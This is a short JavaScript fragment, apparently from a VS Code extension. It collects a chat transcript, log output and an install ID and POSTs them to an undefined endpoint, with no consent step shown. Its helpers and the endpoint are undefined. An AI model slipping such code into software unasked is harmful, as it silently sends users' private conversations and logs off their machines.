const vscode = require('vscode');
const chatTranscript = gatherConversation();
const logBuffer = collectLogs();
fetch(endpoint, {method: 'POST', body: JSON.stringify({chatTranscript, logBuffer, userId: context.globalState.get('installId')})});
